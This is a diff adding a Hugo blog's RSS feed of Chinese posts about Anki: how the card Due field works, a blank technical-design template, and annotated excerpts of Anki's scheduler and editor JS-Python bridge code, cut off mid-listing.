@@ -1,0 +1,1334 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<?xml-stylesheet type="text/xsl" href="https://username.github.io/xml/base.min.xml" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>anki on 张乾坤&#39;s Blog</title>
+    <link>https://username.github.io/tags/anki/</link>
+    <description>Recent content in anki on 张乾坤&#39;s Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 02 Dec 2020 13:56:11 +0800</lastBuildDate>
+    <atom:link href="https://username.github.io/tags/anki/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>彻底搞懂Anki卡片的Due字段</title>
+      <link>https://username.github.io/%E5%BD%BB%E5%BA%95%E6%90%9E%E6%87%82anki%E5%8D%A1%E7%89%87%E7%9A%84due%E5%AD%97%E6%AE%B5/</link>
+      <pubDate>Tue, 16 Mar 2021 15:52:39 +0800</pubDate>
+      <guid>https://username.github.io/%E5%BD%BB%E5%BA%95%E6%90%9E%E6%87%82anki%E5%8D%A1%E7%89%87%E7%9A%84due%E5%AD%97%E6%AE%B5/</guid>
+      <description>&lt;p&gt;Anki卡片的本质是由一系列字段组成的数据结构。卡片的字段可以在Browser中看到，有些字段比较简单，例如Added代表“添加日期”，这是一眼就能看出的。有些字段比较复杂，例如Ease代表间隔扩大系数，需要明白调度算法才能理解。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://username.github.io/images/anki_card_flds.jpeg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;其中有一个Due字段，代表“到期时间”，但不同卡片类型的Due值有所差异，这一点可能让人迷惑，在这里捋一捋。&lt;/p&gt;
+&lt;p&gt;“新卡片”（new card）的Due值是整数。“新卡片”由于还没有学过，所以不存在“到期”一说，但Anki需要决定“新卡片”的显示顺序，哪张在前哪张在后是如何决定的呢？Anki的Deck配置中，有一项专门针对“新卡片”显示顺序的配置“Order”，如下图所示：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://username.github.io/images/WechatIMG1749.jpeg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;关于这个配置项，文档的部分说明如下：&lt;/p&gt;
+&lt;p&gt;Order controls whether Anki should add new cards into the deck randomly, or in order.&lt;/p&gt;
+&lt;p&gt;Anki文档
+“Order”决定了“新卡片”的学习顺序，即“随机显示”或“按添加顺序显示”。如果是“随机显示”，则Anki会将“新卡片”的Due值设置为一个随机的整数。如果是“按添加顺序显示”，则Anki会将每一张“新卡片”的Due值设置为一个更大的整数，下一张总是比上一张的Due值大1，如下图所示：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://username.github.io/images/WechatIMG1750.jpeg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;但有一个例外，无论“新卡片”按哪种顺序显示，只要属于同一个note，则它们的Due值相同，此时顺序就取决于生成卡片的template的序号。Cloze类型的卡片就是这种情况的典型，如下图所示：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://username.github.io/images/WechatIMG1751.jpeg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;“学习中卡片”（learning card）的Due值是Unix时间戳。“新卡片”完成第一次学习后变成“学习中卡片”，其下次的显示时间取决于Deck的Steps配置项。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://username.github.io/images/WechatIMG1752.jpeg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;如果不是在学习卡片的过程中忘记，比如其中一个step是Again，Steps配置项的第一个step是无效的，下次的显示时间由第二个step决定。假如Steps配置项是“10、20、60”，则“新卡片”变成“学习中卡片”后的下次显示时间便是20分钟后。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://username.github.io/images/WechatIMG1753.jpeg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;虽然“学习中卡片”的Due值在Browser中显示的依然是日期，但在内部的表示是一个Unix时间戳，否则就无法确切地知道在哪个时间点再次显示它。对Unix时间戳有疑问的同学请自行了解。假设当前的时间戳是1614944804，按照前面的配置，“学习中卡片”下次显示的时间戳是1614944804+20*60即1614946004。&lt;/p&gt;
+&lt;p&gt;“复习卡片”（review card）的Due值是日期。如果一张卡片从“学习中卡片”变成“复习卡片”，其Due值便从时间戳变成下次显示该卡片的日期，此时的Due才与它的本意更相符。“学习中卡片”第一次变成“复习卡片”的Due值与当天间隔的天数取决于两个配置项，如下图框起的部分所示:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://username.github.io/images/WechatIMG1754.jpeg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;两个配置分别适配两种不同的情况。情况一，“学习中卡片”经过了完整的Steps变成“复习卡片”，比如每个step都是Good，Graduating Interval适配这种情况。情况二，“学习中卡片”未经过完整的Steps变成“复习卡片”，比如其中一个step是Easy，Easy Interval适配这种情况。根据默认配置，情况一中的“复习卡片”显示的日期与当天的间隔是1天，即明天就会再次出现。情况二中的“复习卡片”的显示日期与当天的间隔是3~5天。明明配置是4天，为什么结果是3~5天呢？因为Anki会对大于等于两天的间隔进行随机混淆，目的是为了避免相同间隔的卡片扎堆显示，所以同一天新增的卡片在后面的复习过程中并不是同一天出现，可能相差一天，也可能相差几十天，越往后相差越大。“复习卡片”每成功复习一次，Anki就会为其计算一个比上次间隔更长的新间隔，此时的Due值便是复习当天的日期加上新间隔后的日期。&lt;/p&gt;
+&lt;p&gt;对于不太关心Anki运行原理的同学来说，上面的内容略显枯燥，但相信坚持看下来的同学对Due字段的理解可以说相当透彻。&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>一个技术方案模板</title>
+      <link>https://username.github.io/%E4%B8%80%E4%B8%AA%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88%E6%A8%A1%E6%9D%BF/</link>
+      <pubDate>Wed, 02 Dec 2020 18:03:10 +0800</pubDate>
+      <guid>https://username.github.io/%E4%B8%80%E4%B8%AA%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88%E6%A8%A1%E6%9D%BF/</guid>
+      <description>&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;版本号&lt;/th&gt;
+&lt;th&gt;v1.0.0&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;状态&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;DRAFT&lt;/strong&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;上线时间&lt;/td&gt;
+&lt;td&gt;待定&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;模块负责人&lt;/td&gt;
+&lt;td&gt;xxx&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;当前开发者&lt;/td&gt;
+&lt;td&gt;xxx&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;QA&lt;/td&gt;
+&lt;td&gt;待定&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;排期&#34;&gt;排期&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;任务&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;计划时间&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;实际时间&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;日期&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;状态&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;备注&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;-&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;-&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;-&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;-&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;-&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;-&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;功能简介&#34;&gt;功能简介&lt;/h2&gt;
+&lt;h2 id=&#34;接口列表&#34;&gt;&lt;strong&gt;接口列表&lt;/strong&gt;&lt;/h2&gt;
+&lt;h2 id=&#34;设计思路&#34;&gt;&lt;strong&gt;设计思路&lt;/strong&gt;&lt;/h2&gt;
+&lt;h2 id=&#34;逻辑结构&#34;&gt;&lt;strong&gt;逻辑结构&lt;/strong&gt;&lt;/h2&gt;
+&lt;h2 id=&#34;redis数据结构&#34;&gt;&lt;strong&gt;Redis数据结构&lt;/strong&gt;&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;#&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;Instance&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;Structure&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;Key&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;Field&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;Value/Score&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;1&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;mysql数据结构&#34;&gt;&lt;strong&gt;MySQL数据结构&lt;/strong&gt;&lt;/h2&gt;
+&lt;h2 id=&#34;消息通道数据格式&#34;&gt;&lt;strong&gt;消息通道数据格式&lt;/strong&gt;&lt;/h2&gt;
+&lt;h2 id=&#34;涉及站点&#34;&gt;&lt;strong&gt;涉及站点&lt;/strong&gt;&lt;/h2&gt;
+&lt;h2 id=&#34;涉及服务&#34;&gt;&lt;strong&gt;涉及服务&lt;/strong&gt;&lt;/h2&gt;
+&lt;h2 id=&#34;尚未完整交付项&#34;&gt;&lt;strong&gt;尚未完整交付项&lt;/strong&gt;&lt;/h2&gt;
+&lt;h2 id=&#34;近期相关线上问题与优化措施&#34;&gt;&lt;strong&gt;近期相关线上问题与优化措施&lt;/strong&gt;&lt;/h2&gt;</description>
+    </item>
+    <item>
+      <title>Anki中一张卡片的复习间隔如何变化</title>
+      <link>https://username.github.io/anki%E4%B8%AD%E4%B8%80%E5%BC%A0%E5%8D%A1%E7%89%87%E7%9A%84%E9%97%B4%E9%9A%94%E5%8F%98%E5%8C%96%E6%83%85%E5%86%B5/</link>
+      <pubDate>Wed, 02 Dec 2020 13:56:11 +0800</pubDate>
+      <guid>https://username.github.io/anki%E4%B8%AD%E4%B8%80%E5%BC%A0%E5%8D%A1%E7%89%87%E7%9A%84%E9%97%B4%E9%9A%94%E5%8F%98%E5%8C%96%E6%83%85%E5%86%B5/</guid>
+      <description>&lt;p&gt;新卡片生成后，关闭新增卡片窗口&lt;code&gt;AddCards&lt;/code&gt;，触发调度器重置&lt;code&gt;Scheduler.reset()&lt;/code&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;reset&lt;/span&gt;(self) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; None:
+    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_updateCutoff()
+    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_resetLrn()
+    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_resetRev()
+    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_resetNew()
+    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_haveQueues &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; True
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;新卡片队列&lt;code&gt;Scheduler._newQueue&lt;/code&gt;被清空，并且更新显示新卡片的频率系数：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_resetNew&lt;/span&gt;(self) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; None:
+    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_resetNewCount()
+    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_newDids &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;col&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decks&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;active()[:]
+    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_newQueue: List[int] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
+    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_updateNewCardRatio()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当没有到期的&lt;em&gt;学习中卡片&lt;/em&gt;时，调度器尝试获取&lt;em&gt;新卡片&lt;/em&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_getNewCard&lt;/span&gt;(self) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; Optional[Card]:
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_fillNew():
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;newCount &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;col&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getCard(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_newQueue&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pop())
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; None
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;em&gt;新卡片&lt;/em&gt;的显示顺序参考&lt;a href=&#34;https://username.github.io/anki%E6%96%B0%E5%8D%A1%E7%89%87%E9%A1%BA%E5%BA%8F/&#34;&gt;Anki新卡片顺序&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;新卡片&lt;/em&gt;和&lt;em&gt;学习中卡片&lt;/em&gt;有三个回答按钮：Again、Good、Easy，无论回答哪个都会先变成&lt;em&gt;学习中卡片&lt;/em&gt;，然后按照回答的难易程度对之处理：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;回答Again，等待第一个间隔（step）的时间点到达。&lt;/li&gt;
+&lt;li&gt;回答Good
+&lt;ul&gt;
+&lt;li&gt;如果没有剩余的间隔，则直接变成&lt;em&gt;复习卡片&lt;/em&gt;，默认间隔是1天，取决于&lt;strong&gt;Graduating interval&lt;/strong&gt;配置项。&lt;/li&gt;
+&lt;li&gt;如果有剩余间隔，更新卡片的剩余间隔&lt;code&gt;card.left&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;回答Easy，直接变成&lt;em&gt;复习卡片&lt;/em&gt;，默认间隔是4天，取决于&lt;strong&gt;Easy interval&lt;/strong&gt;配置项。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;&amp;lt;未完待续&amp;gt;&lt;/strong&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Anki编辑器如何将输入同步到对象</title>
+      <link>https://username.github.io/anki%E7%BC%96%E8%BE%91%E5%99%A8%E5%A6%82%E4%BD%95%E5%B0%86%E8%BE%93%E5%85%A5%E5%90%8C%E6%AD%A5%E5%88%B0%E5%AF%B9%E8%B1%A1/</link>
+      <pubDate>Tue, 01 Dec 2020 05:32:02 +0800</pubDate>
+      <guid>https://username.github.io/anki%E7%BC%96%E8%BE%91%E5%99%A8%E5%A6%82%E4%BD%95%E5%B0%86%E8%BE%93%E5%85%A5%E5%90%8C%E6%AD%A5%E5%88%B0%E5%AF%B9%E8%B1%A1/</guid>
+      <description>&lt;pre&gt;&lt;code&gt;Anki版本信息
+-----------
+Tag：2.1.26
+Commit ID: 70784154
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;设置&lt;code&gt;Editor&lt;/code&gt;的&lt;code&gt;webview&lt;/code&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;Editor&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__init__() &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; Editor&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setupWeb() &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; EditorWebView(AnkiWebView)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__init__() &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; AnkiWebView(QWebEngineView)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__init__() &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; AnkiWebView&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setPage(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_page)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;webview&lt;/code&gt;需要一个页面：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_page &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; AnkiWebPage(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_onBridgeCmd)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;通过&lt;a href=&#34;https://doc.qt.io/qt-5/qwebchannel.html&#34;&gt;QWebChannel&lt;/a&gt;实现web页面中的&lt;code&gt;JS&lt;/code&gt;和&lt;code&gt;Python&lt;/code&gt;之间的通讯：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;AnkiWebPage(QWebEnginePage)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__init__() &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; AnkiWebPage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_setupBridge()
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_setupBridge&lt;/span&gt;(self):
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Bridge&lt;/span&gt;(QObject):
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;@pyqtSlot&lt;/span&gt;(str, result&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;str)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cmd&lt;/span&gt;(self, str):
+            &lt;span style=&#34;color:#75715e&#34;&gt;# 被JS代码调用的方法&lt;/span&gt;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; json&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;onCmd(str))
+
+    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_bridge &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Bridge()
+    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_bridge&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;onCmd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_onCmd
+
+    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_channel &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; QWebChannel(self)
+    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_channel&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;registerObject(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;py&amp;#34;&lt;/span&gt;, self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_bridge)
+    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setWebChannel(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_channel)
+
+    js &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; QFile(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;:/qtwebchannel/qwebchannel.js&amp;#34;&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; js&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;open(QIODevice&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ReadOnly)
+    js &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes(js&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;readAll())&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;)
+
+    script &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; QWebEngineScript()
+    script&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setSourceCode(
+        js
+        &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        var pycmd;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        new QWebChannel(qt.webChannelTransport, function(channel) {
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;            // 向python发送消息
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;            pycmd = function (arg, cb) {
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                var resultCB = function (res) {
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                    // pass result back to user-provided callback
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                    if (cb) {
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                        cb(JSON.parse(res));
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                    }
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                }
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                // 调用名称为&amp;#34;py&amp;#34;的对象的cmd方法
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                channel.objects.py.cmd(arg, resultCB);
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                return false;                   
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;            }
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;            pycmd(&amp;#34;domDone&amp;#34;);
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        });
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
+    )
+    script&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setWorldId(QWebEngineScript&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MainWorld)
+    script&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setInjectionPoint(QWebEngineScript&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DocumentReady)
+    script&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setRunsOnSubFrames(False)
+    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;profile()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;scripts()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;insert(script)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当字段内容更新时，&lt;code&gt;JS&lt;/code&gt;需要通知&lt;code&gt;Python&lt;/code&gt;：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;editor.js
+---------
+function setFields(fields) {
+    let txt = &amp;quot;&amp;quot;;
+    for (let i = 0; i &amp;lt; fields.length; i++) {
+        const n = fields[i][0];
+        let f = fields[i][1];
+        if (!f) {
+            f = &amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
+        }
+        txt += `
+        &amp;lt;tr&amp;gt;
+            &amp;lt;td class=fname id=&amp;quot;name${i}&amp;quot;&amp;gt;${n}&amp;lt;/td&amp;gt;
+        &amp;lt;/tr&amp;gt;
+        &amp;lt;tr&amp;gt;
+            &amp;lt;td width=100%&amp;gt;
+                &amp;lt;div id=f${i}
+                     onkeydown=&#39;onKey(window.event);&#39;
+                     oninput=&#39;onInput();&#39;
+                     onmouseup=&#39;onKey(window.event);&#39;
+                     &amp;lt;!----&amp;gt;
+                     onfocus=&#39;onFocus(this);&#39;
+                     onblur=&#39;onBlur();&#39;
+                     class=&#39;field clearfix&#39;
+                     ondragover=&#39;onDragOver(this);&#39;
+                     onpaste=&#39;onPaste(this);&#39;
+                     oncopy=&#39;onCutOrCopy(this);&#39;
+                     oncut=&#39;onCutOrCopy(this);&#39;
+                     contentEditable=true
+                     class=field
+                &amp;gt;${f}&amp;lt;/div&amp;gt;
+            &amp;lt;/td&amp;gt;
+        &amp;lt;/tr&amp;gt;`;
+    }
+    $(&amp;quot;#fields&amp;quot;).html(`
+    &amp;lt;table cellpadding=0 width=100% style=&#39;table-layout: fixed;&#39;&amp;gt;
+${txt}
+    &amp;lt;/table&amp;gt;`);
+    maybeDisableButtons();
+}
+
+function onBlur() {
+    if (!currentField) {
+        return;
+    }
+    // 当前输入框内容变化，或光标失焦，发送事件到Anki
+    if (document.activeElement === currentField) {
+        // other widget or window focused; current field unchanged
+        saveField(&amp;quot;key&amp;quot;);
+    }
+    else {
+        saveField(&amp;quot;blur&amp;quot;);
+        currentField = null;
+        disableButtons();
+    }
+}
+
+// 关键函数
+function saveField(type) {
+    clearChangeTimer();
+    if (!currentField) {
